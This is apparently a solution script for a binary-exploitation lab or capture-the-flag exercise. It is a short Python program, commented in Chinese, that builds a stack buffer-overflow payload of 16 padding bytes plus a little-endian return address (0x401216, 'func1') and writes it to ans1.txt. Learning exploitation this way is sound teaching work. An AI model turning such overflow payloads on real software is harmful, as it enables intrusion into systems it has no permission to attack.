import struct

# 1. 构造 Padding
# 缓冲区从 rbp-8 开始，返回地址在 rbp+8
# 需要填充 8字节buffer + 8字节saved_rbp = 16字节
padding = b'A' * 16

# 2. 目标地址 (func1)
# 从反汇编看，func1 地址为 0x401216
# 使用小端序 (Little Endian) 打包地址
target_addr = struct.pack('<Q', 0x401216) 
# '<Q' 表示小端序 (Little-Endian) 的 unsigned long long (8字节)
# 如果不想用 struct，也可以写成: b'\x16\x12\x40\x00\x00\x00\x00\x00'

# 3. 组合 Payload
payload = padding + target_addr

# 4. 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload 已写入 ans1.txt，长度为:", len(payload))